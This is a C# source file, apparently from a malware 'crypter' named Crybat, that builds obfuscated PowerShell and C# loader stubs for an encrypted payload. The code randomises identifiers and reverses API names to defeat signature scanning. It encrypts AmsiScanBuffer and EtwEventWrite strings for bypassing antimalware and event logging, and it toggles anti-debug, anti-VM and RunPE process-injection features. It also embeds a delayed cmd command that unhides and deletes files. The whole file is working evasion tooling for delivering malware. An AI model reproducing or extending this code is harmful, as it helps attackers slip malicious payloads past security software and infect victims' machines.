using System;
using System.Collections.Generic;
using System.Text;

using static Crybat.Utils;

namespace Crybat
{
    public class StubGen
    {
        public static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
        {
            string frombase64string_var = RandomString(5, rng);
            string readalltext_var = RandomString(5, rng);

            string stubcode = string.Empty;
            if (mode == EncryptionMode.AES)
            {
                stubcode += GetEmbeddedString("Crybat.Resources.AESStub.ps1");
                stubcode = stubcode.Replace("FromBase64String", "('gnirtS46esaBmorF'[-1..-16] -join '')");
                stubcode = stubcode.Replace("ReadAllText", "('txeTllAdaeR'[-1..-11] -join '')");
                stubcode = stubcode.Replace("Load", "('daoL'[-1..-4] -join '')");
                stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
                stubcode = stubcode.Replace("DECRYPTION_IV", Convert.ToBase64String(iv));
                stubcode = stubcode.Replace("contents_var", RandomString(5, rng));
                stubcode = stubcode.Replace("lastline_var", RandomString(5, rng));
                stubcode = stubcode.Replace("line_var", RandomString(5, rng));
                stubcode = stubcode.Replace("payload_var", RandomString(5, rng));
                stubcode = stubcode.Replace("aes_var", RandomString(5, rng));
                stubcode = stubcode.Replace("decryptor_var", RandomString(5, rng));
                stubcode = stubcode.Replace("msi_var", RandomString(5, rng));
                stubcode = stubcode.Replace("mso_var", RandomString(5, rng));
                stubcode = stubcode.Replace("gs_var", RandomString(5, rng));
                stubcode = stubcode.Replace("obfstep1_var", RandomString(5, rng));
                stubcode = stubcode.Replace("obfstep2_var", RandomString(5, rng));
            }
            else
            {
                stubcode += GetEmbeddedString("Crybat.Resources.XORStub.ps1");
                stubcode = stubcode.Replace("FromBase64String", "('gnirtS46esaBmorF'[-1..-16] -join '')");
                stubcode = stubcode.Replace("ReadAllText", "('txeTllAdaeR'[-1..-11] -join '')");
                stubcode = stubcode.Replace("Load", "('daoL'[-1..-4] -join '')");
                stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
                stubcode = stubcode.Replace("contents_var", RandomString(5, rng));
                stubcode = stubcode.Replace("lastline_var", RandomString(5, rng));
                stubcode = stubcode.Replace("line_var", RandomString(5, rng));
                stubcode = stubcode.Replace("payload_var", RandomString(5, rng));
                stubcode = stubcode.Replace("key_var", RandomString(5, rng));
                stubcode = stubcode.Replace("msi_var", RandomString(5, rng));
                stubcode = stubcode.Replace("mso_var", RandomString(5, rng));
                stubcode = stubcode.Replace("gs_var", RandomString(5, rng));
                stubcode = stubcode.Replace("obfstep1_var", RandomString(5, rng));
                stubcode = stubcode.Replace("obfstep2_var", RandomString(5, rng));
            }
            stubcode = stubcode.Replace(Environment.NewLine, string.Empty);
            return stubcode;
        }

        public static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool native, Random rng)
        {
            string namespacename = RandomString(20, rng);
            string classname = RandomString(20, rng);
            string aesfunction = RandomString(20, rng);
            string uncompressfunction = RandomString(20, rng);
            string gerfunction = RandomString(20, rng);
            string virtualprotect = RandomString(20, rng);
            string checkremotedebugger = RandomString(20, rng);
            string isdebuggerpresent = RandomString(20, rng);

            string amsiscanbuffer_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("AmsiScanBuffer"), key, iv));
            string etweventwrite_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("EtwEventWrite"), key, iv));

            string checkremotedebugger_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key, iv));
            string isdebuggerpresent_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("IsDebuggerPresent"), key, iv));
            string payloadtxt_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("payload.exe"), key, iv));
            string runpedlltxt_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("runpe.dll"), key, iv));
            string runpeclass_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("runpe.RunPE"), key, iv));
            string runpefunction_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("ExecutePE"), key, iv));
            string cmdcommand_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -h -s \""), key, iv));
            string key_str = Convert.ToBase64String(key);
            string iv_str = Convert.ToBase64String(iv);

            string stub = string.Empty;
            string stubcode = GetEmbeddedString("Crybat.Resources.Stub.cs");

            if (antidebug) stub += "#define ANTI_DEBUG\n";
            if (antivm) stub += "#define ANTI_VM\n";
            if (native) stub += "#define USE_RUNPE\n";
            if (mode == EncryptionMode.XOR) stub += "#define XOR_ENCRYPT\n";
            else stub += "#define AES_ENCRYPT\n";
            stubcode = stubcode.Replace("namespace_name", namespacename);
            stubcode = stubcode.Replace("class_name", classname);
            stubcode = stubcode.Replace("aesfunction_name", aesfunction);
            stubcode = stubcode.Replace("uncompressfunction_name", uncompressfunction);
            stubcode = stubcode.Replace("getembeddedresourcefunction_name", gerfunction);
            stubcode = stubcode.Replace("virtualprotect_name", virtualprotect);
            stubcode = stubcode.Replace("checkremotedebugger_name", checkremotedebugger);
            stubcode = stubcode.Replace("isdebuggerpresent_name", isdebuggerpresent);
            stubcode = stubcode.Replace("amsiscanbuffer_str", amsiscanbuffer_str);
            stubcode = stubcode.Replace("etweventwrite_str", etweventwrite_str);
            stubcode = stubcode.Replace("checkremotedebugger_str", checkremotedebugger_str);
            stubcode = stubcode.Replace("isdebuggerpresent_str", isdebuggerpresent_str);
            stubcode = stubcode.Replace("payloadtxt_str", payloadtxt_str);
            stubcode = stubcode.Replace("runpedlltxt_str", runpedlltxt_str);
            stubcode = stubcode.Replace("runpeclass_str", runpeclass_str);
            stubcode = stubcode.Replace("runpefunction_str", runpefunction_str);
            stubcode = stubcode.Replace("cmdcommand_str", cmdcommand_str);
            stubcode = stubcode.Replace("key_str", key_str);
            stubcode = stubcode.Replace("iv_str", iv_str);
            stub += stubcode;

            return stub;
        }
    }
}